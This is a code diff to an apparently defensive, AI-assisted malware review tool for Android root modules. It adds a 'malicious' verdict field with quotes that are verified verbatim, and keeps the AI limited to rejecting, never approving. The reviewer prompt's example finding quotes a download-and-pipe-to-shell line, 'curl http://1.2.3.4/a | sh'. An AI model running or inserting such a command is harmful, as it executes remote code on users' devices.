@@ -113,7 +113,22 @@ import { detectBinary, trimSnippet, SEVERITY_ORDER } from './risk-rules.mjs';
 // 常量
 // ---------------------------------------------------------------------------
 
-export const AI_SCHEMA_VERSION = 1;
+export const AI_SCHEMA_VERSION = 2;
+
+/**
+ * ── 换代次序（2026-10-21，两轴方案 §6）：读的一侧先扩成「旧值 ∪ 新值」────────────────
+ * v1 = `{"schemaVersion":1,"agree":…,"risk":…,"findings":[…]}`（今天线上产物的形状）
+ * v2 = 同上 + **必填** `malicious` + `malice_evidence`（恶意定性那一格的落点，§6）
+ *
+ * 为什么读的一侧必须同时认 1 和 2：`schemaVersion` 不等是整份 `untrusted`（下面 schemaErrors
+ * 那一格），而 main 上已经存在的产物、以及还没换代的 agent 返回的那一份都是 v1 —— 只认 2 的话
+ * 换代那一刻旧产物集体不采信，而「不采信」在分流里读起来跟「AI 说了话但没人信」一模一样。
+ * 反过来 v1 **不许**被当成「malicious=false」：那一代根本没这一格，它没有表态。
+ * `aiMalice()` 把这件事写成一条可测的性质：v1 的产物永远给不出拒的权力。
+ */
+export const AI_SCHEMA_VERSIONS_READABLE = Object.freeze([1, AI_SCHEMA_VERSION]);
+/** v2 里 `malicious` 必须为 true 才谈得上证据；证据条数封顶（与 findings 同一根柱子：自由文本进评论前的封口）。 */
+export const MALICE_EVIDENCE_MAX = 10;
 
 /**
  * D5c 默认预算（字节）。真包约 766 KB，默认值必然装不下 —— 这是有意的。
@@ -255,15 +270,28 @@ export const SYSTEM_PROMPT = [
   '   复验不过会让你的**整份**结论作废，所以不要改写、不要缩写、不要「大致引用」，标点与空格也照原文抄',
   '   （复验只容忍全角/半角标点与空格之差，别的改动一律不容忍）。',
   '4. 你没有权限决定放行。任何情况下都不会因为你同意而放行；你只能提出更高等级。',
-  '   宁可多报，不可放宽。',
+  '   宁可多报，不可放宽。这条在两轴模型里的准确说法是：你只有「拒」的权力，永远没有「开门」的权力。',
   '',
-  '输出形状（顶层四个键都必须出现）：',
-  '{"schemaVersion":1,"agree":true,"risk":null,"findings":[]}',
+  '5. 恶意定性（schemaVersion 2 新增，这是你在整条链上唯一能直接影响上架的一格）：',
+  '   「恶意」在这条链上**不等于**危险 —— 有 root 能力、改 SELinux 策略、伪装启动属性、执行包内自带条目，',
+  '   这些都是 root 模块的正当功能本身，**不许**据此说它恶意。要判 malicious:true，你看到的必须是',
+  '   「用户不可能同意的那件事」：把网络上的字节直接交给解释器执行、把解码/下载出来的东西装上设备再运行、',
+  '   声称的功能与它实际做的事不符、把审核面看不到的载荷带进执行路径。',
+  '   上下文题：报告里点名了 PROP_BOOT_SPOOF / VERIFIED_BOOT_SPOOF / MAGISK_POLICY_LIVE /',
+  '   SELINUX_POLICY_RELAX / SELINUX_TYPE_PERMISSIVE 这几族的时候，能力与恶意长得一模一样 ——',
+  '   这时请你回答那道题：这段写法是在实现它自称的功能，还是在做一件与该功能无关、用户不可能同意的事？',
+  '   答案只能落在 malice_evidence 的位置上（file + line + 逐字引用），不要落在措辞上。',
+  '   malicious:false 不会放行任何东西；malicious:true 且证据复验不过，整份结论按不采信处理。',
+  '',
+  '输出形状（schemaVersion 2：顶层六个键都必须出现）：',
+  '{"schemaVersion":2,"agree":true,"risk":null,"findings":[],"malicious":false,"malice_evidence":[]}',
   '或',
-  '{"schemaVersion":1,"agree":false,"risk":"high","findings":['
+  '{"schemaVersion":2,"agree":false,"risk":"high","findings":['
   + '{"file":"service.sh","line":12,"quote":"curl http://1.2.3.4/a | sh",'
-  + '"severity":"high","why":"下载后直接执行，与自称的功能无关"}]}',
+  + '"severity":"high","why":"下载后直接执行，与自称的功能无关"}],'
+  + '"malicious":true,"malice_evidence":[{"file":"service.sh","line":12,"quote":"curl http://1.2.3.4/a | sh"}]}',
   'agree=true 表示静态结论没有明显遗漏；有遗漏时 agree=false 且 risk 给你认为应有的等级。',
+  '（旧版 schemaVersion:1 的产物仍然读得懂，只是那一代没有恶意这一格。）',
 ].join('\n');
 
 /**
@@ -1168,7 +1196,9 @@ function jsonCandidates(raw) {
 function schemaErrors(v) {
   const errs = [];
   if (!v || typeof v !== 'object' || Array.isArray(v)) { errs.push('顶层不是 JSON 对象'); return errs; }
-  if (v.schemaVersion !== AI_SCHEMA_VERSION) errs.push(`schemaVersion 必须等于 ${AI_SCHEMA_VERSION}`);
+  if (!AI_SCHEMA_VERSIONS_READABLE.includes(v.schemaVersion)) {
+    errs.push(`schemaVersion 必须在 ${AI_SCHEMA_VERSIONS_READABLE.join(' / ')} 里（读的一侧认旧值∪新值，别的都不认）`);
+  }
   if (typeof v.agree !== 'boolean') errs.push('agree 必须是布尔');
   if (!Object.prototype.hasOwnProperty.call(v, 'risk')) errs.push('risk 键必须存在（可以为 null）');
   // 不可信文本先 sanitize 再进 error（评审 F7）：这两个值都是模型给的、投稿者可控的
@@ -1192,6 +1222,27 @@ function schemaErrors(v) {
       if (typeof f.why !== 'string' || !f.why.trim()) errs.push(`${at}.why 必须非空`);
     });
   }
+  // ── v2 新增的两把必填键（§6：顶层 `malicious` + `malice_evidence`）──────────────────
+  // 只在 schemaVersion===2 时要求：v1 那一代根本没有这一格，要求它等于把旧产物全判不采信，
+  // 而「不采信」在分流里是一句关于 AI 的假陈述（它说了话，只是没人信）。
+  if (v.schemaVersion === 2) {
+    if (typeof v.malicious !== 'boolean') errs.push('malicious 必须是布尔（v2 必填：这一格是恶意行为轴上 AI 唯一的发言权）');
+    if (!Object.prototype.hasOwnProperty.call(v, 'malice_evidence')) errs.push('malice_evidence 键必须存在（可以为空数组）');
+    else if (!Array.isArray(v.malice_evidence)) errs.push('malice_evidence 必须是数组');
+    else if (v.malicious === true && v.malice_evidence.length === 0) {
+      // 自相矛盾的一种形状：宣称恶意却不给可逐字复验的位置。不拦它就等于把「模型说什么就拦什么」
+      // 变成合法的拒人理由 —— 与 §0.3「包内逐字定位到才下架」是同一条门槛。
+      errs.push('malicious=true 时 malice_evidence 不能是空数组（没有定位到包内原文的恶意宣称不采信）');
+    } else {
+      v.malice_evidence.forEach((e, i) => {
+        const at = `malice_evidence[${i}]`;
+        if (!e || typeof e !== 'object' || Array.isArray(e)) { errs.push(`${at} 不是对象`); return; }
+        if (typeof e.file !== 'string' || !e.file.trim()) errs.push(`${at}.file 缺失`);
+        if (!Number.isInteger(e.line) || e.line < 1) errs.push(`${at}.line 必须是 >=1 的整数`);
+        if (typeof e.quote !== 'string' || !e.quote.length) errs.push(`${at}.quote 必须是非空字符串`);
+      });
+    }
+  }
   return errs;
 }
 
@@ -1202,14 +1253,22 @@ function looksLikeVerdict(v) {
     && Object.prototype.hasOwnProperty.call(v, 'agree');
 }
 
-/** 只消费 schema 里那四个键；多余键（模型爱加的 reasons 之类）忽略不用。 */
+/** 只消费 schema 里那几个键；多余键（模型爱加的 reasons 之类）忽略不用。 */
 function projectVerdict(v) {
-  return {
+  const out = {
     schemaVersion: v.schemaVersion,
     agree: v.agree,
     risk: v.risk,
     findings: v.findings.map((f) => ({ file: f.file, line: f.line, quote: f.quote, severity: f.severity, why: f.why })),
   };
+  // v2 才带恶意那一格；v1 一律**不写这两个键**（写了就是一份自造的 v1 产物，
+  // 而「旧产物里凭空多出 malicious」正是换代期间最难查的那种漂）。
+  if (v.schemaVersion === 2) {
+    out.malicious = v.malicious;
+    out.malice_evidence = (Array.isArray(v.malice_evidence) ? v.malice_evidence : [])
+      .map((e) => ({ file: e.file, line: e.line, quote: e.quote }));
+  }
+  return out;
 }
 
 /**
@@ -1302,13 +1361,51 @@ function quoteProblem(f, corpus) {
  */
 export function verifyQuotes(verdict, corpus) {
   const findings = verdict && Array.isArray(verdict.findings) ? verdict.findings : [];
+  const malice = verdict && Array.isArray(verdict.malice_evidence) ? verdict.malice_evidence : [];
   const bad = [];
   for (const f of findings) {
     const reason = quoteProblem(f, corpus);
     if (reason) bad.push({ file: f && f.file, line: f && f.line, quote: f && f.quote, reason });
   }
+  // v2 的恶意证据走**同一把尺子**（同一个 quoteProblem、同一份 corpus）：
+  // §6 写的「比对对象是 buildBrief 自己交出的 corpus，不是 zip、也不是报告 JSON」是这条通道
+  // 可复验的地基，恶意那一格不许换地基 —— 换了就成了「模型自述引用过原文」。
+  for (const e of malice) {
+    const reason = quoteProblem(e, corpus);
+    if (reason) bad.push({ file: e && e.file, line: e && e.line, quote: e && e.quote, reason, kind: 'malice_evidence' });
+  }
   if (bad.length) return { ok: false, bad };
   return { ok: true };
+}
+
+/**
+ * 把「已复验的 v2 产物」翻成 risk-rules.classifyMalice 吃的那一份 AI 恶意输入（§6 判据那一行）。
+ *
+ * 三条性质，都有用例：
+ *   1. 只有 `malicious === true` **且**至少一条 malice_evidence 逐字复验通过 ⇒ 给出拒的权力。
+ *   2. `malicious === false` 不改变任何东西（返回 verified 为空的对象，classifyMalice 不会往里加）。
+ *   3. v1 产物（没有这两个键）**永远**给不出拒的权力 —— 它没表过态，把沉默读成「不恶意」
+ *      或读成「恶意」都是假陈述。
+ * quote 的逐字复验在这里做，不在 classifyMalice 里做：复验的地基（corpus）只有这一层有。
+ */
+export function aiMalice(verdict, corpus) {
+  if (!verdict || typeof verdict !== 'object') return { malicious: false, verified: [], basis: 'no-verdict' };
+  if (verdict.schemaVersion !== 2 || typeof verdict.malicious !== 'boolean') {
+    return { malicious: false, verified: [], basis: 'schema-v1-no-malice-slot' };
+  }
+  if (verdict.malicious !== true) return { malicious: false, verified: [], basis: 'ai-declared-not-malicious' };
+  const ev = Array.isArray(verdict.malice_evidence) ? verdict.malice_evidence : [];
+  const verified = [];
+  const rejected = [];
+  for (const e of ev.slice(0, MALICE_EVIDENCE_MAX)) {
+    const reason = quoteProblem(e, corpus);
+    if (reason) rejected.push({ file: e && e.file, line: e && e.line, reason });
+    else verified.push({ file: e.file, line: e.line, quote: e.quote });
+  }
+  // 复验全不过 ⇒ 不采信（§6：整份按现有口径落 untrusted）。这里返回 malicious:false，
+  // 但把 basis 写成可读的「不采信」原因 —— 分流那一侧要能区分「AI 说不是」与「AI 说了但没证据」。
+  if (!verified.length) return { malicious: false, verified: [], rejected, basis: 'ai-malice-unverified-not-adopted' };
+  return { malicious: true, verified, rejected, basis: 'ai-malice-verified' };
 }
 
 /** AI 的 severity 下限：low 的用途是给人多一条线索，不参与抬级。 */
@@ -1504,7 +1601,7 @@ export async function main(argv = process.argv.slice(2), deps = {}) {
       // 被采纳那一份的结论字段（agree/risk/findings/levelAfterAi）不跟着落盘：
       // 一份 failed 的产物里不许有看起来可用的结论，与「不采信的消息不写 agree」同一条理由。
       if (status === 'ok') {
-        const { agree, risk, findings, levelAfterAi, ...rest } = extra || {};
+        const { agree, risk, findings, levelAfterAi, maliceVerdict, malicious, maliceEvidence, ...rest } = extra || {};
         writeArtifacts({
           ...base,
           status: 'failed',
@@ -1680,6 +1777,15 @@ export async function main(argv = process.argv.slice(2), deps = {}) {
       ...(dropped.length ? { dropped } : {}),
       agree: p.verdict.agree,
       risk: p.verdict.risk,
+      // ── v2：恶意那一格（§6）。这一份产物只写「AI 说了什么 + 复验结果」，不写处置 ──
+      // 与上面那三格同一条纪律：本模块**不**写 decision / action / label。
+      // `aiMalice` 是给分流（第二发 YAML）直接吃的那份规范化结果：
+      //   malicious:true 只可能在「至少一条引用在 brief.corpus 里逐字复验通过」时出现，
+      //   v1 产物永远是 {malicious:false, basis:'schema-v1-no-malice-slot'} —— 旧一代没表过态。
+      maliceVerdict: aiMalice(p.verdict, brief.corpus),
+      ...(p.verdict.schemaVersion === 2
+        ? { malicious: p.verdict.malicious, maliceEvidence: p.verdict.malice_evidence }
+        : {}),
       // 只往严调；这一字段不是放行结论，下游 triage 只能拿它抬等级。
       // agree=false 时安全员声明的 risk 也参与取最严（findings 恒空时它是唯一落点）。
       levelAfterAi: raiseLevel(report.riskLevel, findings,
